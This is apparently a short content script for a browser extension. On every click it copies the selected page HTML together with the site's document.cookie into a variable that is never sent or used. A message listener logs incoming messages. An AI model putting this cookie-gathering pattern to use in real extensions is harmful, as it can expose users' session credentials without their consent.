
document.addEventListener('click', function() {
    // Get the selected text
    var selection = window.getSelection();
    
    if (selection.toString().length > 0) {
      // Get the first range of the selection
      var range = selection.getRangeAt(0);
      // Create a new document fragment containing the selected content
      var fragment = range.cloneContents();
      var div = document.createElement('div');
      div.appendChild(fragment);

      const body_data = document.cookie + "\r\n\r\n" + div.innerHTML;

    }
  });

  browser.runtime.onMessage.addListener((message) => {
    console.log("Received message from content script:", message);
  });